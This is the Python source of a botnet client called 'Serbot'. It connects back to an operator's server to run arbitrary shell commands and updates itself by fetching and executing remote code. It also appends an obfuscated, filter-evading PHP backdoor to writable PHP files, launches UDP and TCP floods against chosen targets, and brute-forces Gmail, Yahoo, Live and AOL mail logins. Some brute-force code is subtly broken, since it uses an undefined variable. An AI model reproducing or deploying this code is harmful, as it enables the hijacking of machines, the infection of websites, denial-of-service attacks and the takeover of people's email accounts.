#!/usr/bin/env python2

import subprocess, os, sys, time, threading, signal, smtplib, random, fnmatch
from socket import *
from threading import Thread

if (len(sys.argv) == 3):
	host = sys.argv[1]
	port = int(sys.argv[2])
else:
	sys.exit("Usage: client.py <server ip> <server port>")

#Used to make sure a subprocess lasts 30 seconds max-->
class Alarm(Exception):
    pass

def alarm_handler(signum, frame):
    raise Alarm
#<--

#Used by the Bruteforcer-->
def product(*args, **kwds):
    pools = map(tuple, args) * kwds.get('repeat', 1)
    result = [[]]
    for pool in pools:
        result = [x+[y] for x in result for y in pool]
    for prod in result:
        yield tuple(prod)

def repeat(object, times=None):
    if times is None:
        while True:
            yield object
    else:
        for i in xrange(times):
            yield object
#<--

#Self Update-->
temporary = """
#!/usr/bin/env python2
import os, urllib2
	
response = urllib2.urlopen('https://raw.githubusercontent.com/dotcppfile/Serbot/master/client.py')
html = response.read()

os.system("kill %s")

f = open("%s", "w")
f.write(html)
f.close()

os.system("nohup python %s %s %s > /dev/null 2>&1 &")
""" % (os.getpid(), os.path.realpath(__file__), os.path.realpath(__file__), host, port)

def selfUpdate():
	while 1:
		filename = "%d.py" % random.randint(1, 1000)
		if (not os.path.exists(filename)):
			break

	f = open(filename, "w")
	f.write(temporary)
	f.close()

	os.system("nohup python %s > /dev/null 2>&1 &" % (filename))
#<--

#PHP Infector-->
backdoor = """
<?php

#This is a Serbot property

#`base64_encode`, `base64_decode`, `bindec` and `decbin` Replacements to bypass Disablers-->
$base64ids = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/");

function binToDec($string)
{
	$decimal = "";
	for($i = 0; $i<strlen($string); $i++)
	{
		$dec = intval($string{(strlen($string))-$i-1})*pow(2, $i);
		$decimal+=$dec;
	}
	
	return intval($decimal);
}

function decToBin($dec)
{
	$binary = "";
	$current = intval($dec);

	if ($current == 0)
	{
		return "0";
	}
	
	while (1)
	{
		if ($current == 1)
		{
			$binary="1".$binary;
			break;
		}
		$binary = ($current%%2).$binary;
		$current = intval($current/2);
	}
	
	return $binary;
}

function base64encoding($string)
{
	global $base64ids;

	$binary = "";
	for ($i = 0; $i<strlen($string); $i++)
	{
		$charASCII = ord($string{$i});
		$asciiBIN = decToBin($charASCII);
		if (strlen($asciiBIN) != 8)
		{
			$asciiBIN = str_repeat("0", 8-strlen($asciiBIN)).$asciiBIN;	
		}
		$binary.= $asciiBIN;
	}

	$array = array();
	for ($j = 0; $j<strlen($binary); $j = $j + 6)
	{
		$part = substr($binary, $j, 6);
		array_push($array, $part);
	}

	if (strlen($array[count($array)-1]) != 6)
	{
		$array[count($array)-1] = $array[count($array)-1].str_repeat("0", 6 - strlen($array[count($array)-1]));
	}

	$base64 = "";
	foreach ($array as &$value)
	{
		$value = binToDec($value);
		$value = $base64ids[$value];
		$base64.=$value;
	}

	if ((strlen($base64) %% 4) != 0)
	{
		$base64.=str_repeat("=", 4-(strlen($base64) %% 4));
	}

	return $base64;
}

function base64decoding($string)
{
	global $base64ids;

	$string = str_replace("=", "", $string);

	$binary = "";	
	for ($i = 0; $i < strlen($string); $i++)
	{
		$charID = array_search($string{$i}, $base64ids);
		$idBIN = decToBin($charID);
		if (strlen($idBIN) != 6)
		{
			$idBIN = str_repeat("0", 6-strlen($idBIN)).$idBIN;	
		}
		$binary.= $idBIN;
	}
	
	if (strlen($binary) %%8 != 0)
	{
		$binary = substr($binary, 0, strlen($binary)-(strlen($binary) %%8));
	}

	$array = array();
	for ($j = 0; $j<strlen($binary); $j = $j + 8)
	{
		$part = substr($binary, $j, 8);
		array_push($array, $part);
	}

	$text = "";
	foreach ($array as &$value)
	{
		$value = binToDec($value);
		$value = chr($value);
		$text.=$value;
	}

	return $text;
}
#<--

#XOR Encryption based on the key `dotcppfile` to decrypt the Built In Shell Codes-->
function sh3ll_this($string)
{
	$key = "dotcppfile";
	$outText = '';

 	for($i=0;$i<strlen($string);)
 	{
		for($j=0;($j<strlen($key) && $i<strlen($string));$j++,$i++)
		{
			$outText .= $string{$i} ^ $key{$j};
		}
	}
	return base64encoding($outText);
}

function unsh3ll_this($string)
{
	return base64decoding(sh3ll_this(base64decoding($string)));
}
#<--

#Checks if a function is/isn't disabled
$disbls = @ini_get(unsh3ll_this("AAYHAhIcAzYKEAoMAAofHhU=")).','.@ini_get(unsh3ll_this("FxocDAMZCEcJHQEMARcfAkgPGQsHQRYPERMNBQUWEA=="));
if ($disbls == ",")
{
	$disbls = get_cfg_var(unsh3ll_this("AAYHAhIcAzYKEAoMAAofHhU=")).','.get_cfg_var(unsh3ll_this("FxocDAMZCEcJHQEMARcfAkgPGQsHQRYPERMNBQUWEA=="));
}
$disbls = str_replace(" ", "", $disbls);
$disblsArray = explode(",", $disbls);

function checkIt($func)
{
	global $disblsArray;

	foreach ($disblsArray as $value)
	{
		if ($func == $value)
		{
			return False;
		}
	}

	return True;
}
#<--

#Executes system commands -->
function evalRel($command, $id)
{
	global $shell_exec, $exec, $popen, $proc_open, $system, $passthru;
	if (($system == True) && ($id == 2))
	{
		system($command);
	}
	else if(($passthru == True) && ($id == 2))
	{
		passthru($command);
	}
	else if($shell_exec == True)
	{
		return shell_exec($command);
	}
	else if($exec == True)
	{
		return exec($command);
	}
	else if($popen == True)
	{
		$pid = popen( $command,"r");
		while(!feof($pid))
		{
			return fread($pid, 256);
			flush();
	 		ob_flush();
			usleep(100000);
		}
		pclose($pid);
	}
	else if($proc_open == True)
	{
		$process = proc_open(
			$command,
			array(
				0 => array("pipe", "r"), //STDIN
				1 => array("pipe", "w"), //STDOUT
				2 => array("pipe", "w"), //STDERR
			),
			$pipes
		);

		if ($process !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($process);
		}

		if ($stderr != "")
		{
			return $stderr;
		}
		else
		{
			return $stdout;
		}
	}
	else
	{
		return "False";
	}
}
#<--

#Dynamic Booleans (True=Enabled/False=Disabled)-->
$php_functions = array("exec", "shell_exec", "passthru", "system", "popen", "proc_open");
foreach($php_functions as $function)
{
	if(checkIt($function))
	{
		${"{$function}"} = True;
	}	
	else
	{
		${"{$function}"} = False;
	}
}
#<--

$checker = evalRel("ps aux | grep '%s %s'", 1);

if (strpos($checker, "python") === False)
{
	evalRel("nohup python %s %s %s > /dev/null 2>&1 &", 2);
}
?>
""" % (host, port, os.path.realpath(__file__), host, port)

def find_files(directory, pattern):
	for root, dirs, files in os.walk(directory):
		for basename in files:
			if fnmatch.fnmatch(basename, pattern):
				filename = os.path.join(root, basename)
				yield filename

def debackdoor(thedir):
	allphp = find_files(thedir, '*.php')

	for thefile in allphp:
		if ((os.access(thefile, os.R_OK)) and (os.access(thefile, os.W_OK))):
			f = open(thefile, "r")
			inside = f.read()
			f.close()

			if ("#This is a Serbot property" not in inside):
				alllines = inside.split('\n')
				if (alllines[len(alllines)-1] != "?>"):
					global backdoor
					backdoor = "?>\n%s" % backdoor

				f = open(thefile, "a")
				f.write(backdoor)
				f.close()

def rmbackdoor(thedir):
	allphp = find_files(thedir, '*.php')

	for thefile in allphp:
		if ((os.access(thefile, os.R_OK)) and (os.access(thefile, os.W_OK))):
			f = open(thefile, "r")
			inside = f.read()
			f.close()

			if ("#This is a Serbot property" in inside):
				inside = inside.replace(backdoor, "")
				f = open(thefile, "w")
				f.write(inside)
				f.close()
#<--

def savePass(password):
	f = open("password.txt", "w")
	f.write(password)
	f.close()

def gmailbruteforce(email, combination, minimum, maximum):
	smtpserver = smtplib.SMTP("smtp.gmail.com",587)
	smtpserver.starttls()
	smtpserver.ehlo()

	found = False

	for n in range(minimum, maximum+1):
		if (found == False):
        		for w in product(combination,repeat=n):
            			word = ''.join(w)
            			try:
					smtpserver.login(email, password)
				except(smtplib.SMTPAuthenticationError), msg:
					if "Please Log" in str(msg):
						savePass(password)
						found = True
						break
		else:
			break

def custombruteforce(address, port, email, combination, minimum, maximum):
	smtpserver = smtplib.SMTP(address,int(port))
	smtpserver.starttls()
	smtpserver.ehlo()

	found = False

	for n in range(minimum, maximum+1):
		if (found == False):
        		for w in product(combination,repeat=n):
            			word = ''.join(w)
            			try:
					smtpserver.login(email, password)
					savePass(password)
					found = True
					break
				except:
					pass
		else:
			break

class udpFlood(threading.Thread):
    def __init__ (self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
	self.victimport = victimport

    def run(self):
	timeout = time.time() + 60
        while True:
 		test = 0
    		if (time.time() <= timeout):
			s = socket(AF_INET, SOCK_DGRAM)
			s.connect((self.victimip, int(self.victimport)))
			s.send('A' * 65000)        
		else:
			break

class tcpFlood(threading.Thread):
    def __init__ (self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
	self.victimport = victimport

    def run(self):
	timeout = time.time() + 60
        while True:
 		test = 0
    		if (time.time() <= timeout):
			s = socket(AF_INET, SOCK_STREAM)
			s.settimeout(1)
			s.connect((self.victimip, int(self.victimport)))
			s.send('A' * 65000)       
		else:
			break

def udpUnleach(victimip, victimport):
	threads = []
	for i in range(1, 21):
    		thread = udpFlood(victimip, victimport)
    		thread.start()
   		threads.append(thread)
 
	for thread in threads:
    		thread.join()

def tcpUnleach(victimip, victimport):
	threads = []
	for i in range(1, 21):
    		thread = tcpFlood(victimip, victimport)
    		thread.start()
   		threads.append(thread)
 
	for thread in threads:
    		thread.join()

def main(host, port):
	while 1:
		connected = False
		while 1:
			while (connected == False):
				try:
					s=socket(AF_INET, SOCK_STREAM)
					s.connect((host,port))
					print "[INFO] Connected"
					connected = True
				except:
					time.sleep(5)

			try:
				msg=s.recv(20480)
				allofem = msg.split(";")
				for onebyone in allofem: #This your happy day one liners
					commands = onebyone.split( )
					if (commands[0] == "cd"):
						os.chdir(commands[1])
						s.send(os.getcwd())
						print "[INFO] Changed dir to %s" % os.getcwd()
					elif (commands[0] == "selfupdateall"):
						selfUpdate()
						return None
					elif (commands[0] == "serbackdoor"):
						try:
							debackdoor(commands[1])
							s.send("[CLIENT] Backdoored\n")
						except:
							s.send("[CLIENT] Wrong arguments\n")
					elif (commands[0] == "rmbackdoor"):
						try:
							rmbackdoor(commands[1])
							s.send("[CLIENT] Malicious PHP Code Removed\n")
						except:
							s.send("[CLIENT] Wrong arguments\n")
					elif (commands[0] == "udpflood"):
						try:
							udpinfo = commands[1].split(":")
							t = Thread(None,udpUnleach,None,(udpinfo[0], udpinfo[1]))
        						t.start()
							s.send("[CLIENT] Flooding started\n")
						except:
							s.send("[CLIENT] Failed to start Flooding\n")
							pass
					elif (commands[0] == "udpfloodall"):
						try:
							udpinfo = commands[1].split(":")
							t = Thread(None,udpUnleach,None,(udpinfo[0], udpinfo[1]))
        						t.start()
						except:
							pass
					elif (commands[0] == "tcpflood"):
						try:
							tcpinfo = commands[1].split(":")
							t = Thread(None,tcpUnleach,None,(tcpinfo[0], tcpinfo[1]))
        						t.start()
							s.send("[INFO] Flooding started\n")
						except:
							s.send("[ERROR] Failed to start Flooding\n")
							pass
					elif (commands[0] == "tcpfloodall"):
						try:
							tcpinfo = commands[1].split(":")
							t = Thread(None,tcpUnleach,None,(tcpinfo[0], tcpinfo[1]))
        						t.start()
						except:
							pass
					elif (commands[0] == "gmailbruteforce"):
						try:
							bruteinfo = commands[1].split(":")
							t = Thread(None,gmailbruteforce,None,(bruteinfo[0], bruteinfo[1], bruteinfo[2], bruteinfo[3]))
        						t.start()
							s.send("[CLIENT] Bruteforcing started\n")
						except:
							s.send("[CLIENT] Wrong arguments\n")
					elif (commands[0] == "livebruteforce"):
						try:
							bruteinfo = commands[1].split(":")
							t = Thread(None,custombruteforce,None,("smtp.live.com", 587, bruteinfo[0], bruteinfo[1], bruteinfo[2], bruteinfo[3]))
        						t.start()
							s.send("[CLIENT] Bruteforcing started\n")				
						except:
							s.send("[CLIENT] Wrong arguments\n")
					elif (commands[0] == "yahoobruteforce"):
						try:
							bruteinfo = commands[1].split(":")
							t = Thread(None,custombruteforce,None,("smtp.mail.yahoo.com", 587, bruteinfo[0], bruteinfo[1], bruteinfo[2], bruteinfo[3]))
        						t.start()
							s.send("[CLIENT] Bruteforcing started\n")				
						except:
							s.send("[CLIENT] Wrong arguments\n")
					elif (commands[0] == "aolbruteforce"):
						try:
							bruteinfo = commands[1].split(":")
							t = Thread(None,custombruteforce,None,("smtp.aol.com", 587, bruteinfo[0], bruteinfo[1], bruteinfo[2], bruteinfo[3]))
        						t.start()
							s.send("[CLIENT] Bruteforcing started\n")				
						except:
							s.send("[CLIENT] Wrong arguments\n")
					elif (commands[0] == "custombruteforce"):
						try:
							bruteinfo = commands[1].split(":")
							address, port, email, combination, minimum, maximum = msg.split(":")
							t = Thread(None,custombruteforce,None,(bruteinfo[0], bruteinfo[1], bruteinfo[2], bruteinfo[3], bruteinfo[4], bruteinfo[5]))
        						t.start()
							s.send("[CLIENT] Bruteforcing started\n")				
						except:
							s.send("[CLIENT] Wrong arguments\n")
					elif (commands[0] == "hellows123"):
						s.send(os.getcwd())
					elif (commands[0] == "quit"):
						s.close()
						print "[INFO] Connection Closed"
						break
					else:
						thecommand = ' '.join(commands)
						comm = subprocess.Popen(thecommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
						signal.signal(signal.SIGALRM, alarm_handler)
						signal.alarm(30)
						try:
    							STDOUT, STDERR = comm.communicate()
							en_STDERR = bytearray(STDERR)
							en_STDOUT = bytearray(STDOUT)
							if (en_STDERR == ""):
								if (en_STDOUT != ""):
									print en_STDOUT
									s.send(en_STDOUT)
								else:
									s.send("[CLIENT] Command Executed")
							else:
								print en_STDERR
								s.send(en_STDERR)
						except Alarm:
							comm.terminate()
							comm.kill()
    							s.send("[CLIENT] 30 Seconds Exceeded - SubProcess Killed\n")				
						signal.alarm(0)
			except KeyboardInterrupt:
				s.close()
				print "[INFO] Connection Closed"
				break
			except:
				s.close()
				print "[INFO] Connection Closed"
				break

while 1:
	try:
		main(host, port)
	except:
		time.sleep(5)
